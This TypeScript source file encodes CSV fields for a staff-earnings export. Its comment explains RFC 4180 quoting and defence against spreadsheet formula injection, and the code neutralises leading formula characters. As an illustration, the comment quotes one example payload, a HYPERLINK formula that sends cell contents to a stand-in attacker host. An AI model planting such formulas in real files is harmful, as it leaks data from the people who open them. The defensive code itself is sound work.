/**
 * CSV field encoding for exports that contain free text.
 *
 * **Every export this system had before ADR-067 emitted only machine-generated values** — UUIDs,
 * ISO dates, decimal strings, and emails — so a raw `join(",")` was safe by accident rather than
 * by design. The staff-earnings export is the first to emit a value a human typed: `displayName`.
 * That changes two things at once, and both are handled here rather than at each call site.
 *
 * **1. Delimiters. A name containing a comma silently corrupts the file** — it shifts every
 * following column by one, and nothing errors. `O'Brien, Jr.` is an ordinary name, not hostile
 * input. RFC 4180's rule is applied: a field containing a comma, a double quote, CR or LF is
 * wrapped in double quotes and its own quotes are doubled.
 *
 * **2. Formula injection, which is the security half.** A spreadsheet treats a cell beginning
 * `=`, `+`, `-`, `@`, TAB or CR as a formula, and an accountant opening a file we generated is
 * precisely the person who would trust it. A waiter who sets their own display name to
 * `=HYPERLINK("http://attacker.example/"&A1,"Total")` is not attacking us — they are attacking the
 * bookkeeper who opens our export. This is untrusted input reaching a third party through a file
 * we produced, which makes it ours to neutralise.
 *
 * The neutralisation is a leading apostrophe, which spreadsheets consume when displaying the cell.
 * **It changes the bytes**, and that is a deliberate trade: a name is a label to read, and a
 * label's job is to be read safely. Any consumer needing the exact original reads the JSON route,
 * which is not a spreadsheet and is not affected.
 */

const NEEDS_QUOTING = /[",\r\n]/;

/** Characters a spreadsheet reads as "this cell is a formula" when they lead the cell. */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

export function csvField(value: string): string {
  const neutralised = FORMULA_LEAD.test(value) ? `'${value}` : value;
  if (!NEEDS_QUOTING.test(neutralised)) return neutralised;
  return `"${neutralised.replace(/"/g, '""')}"`;
}

/** One CSV line from already-computed fields, each encoded by `csvField`. */
export function csvLine(fields: Array<string | number>): string {
  return fields.map((f) => csvField(String(f))).join(",");
}
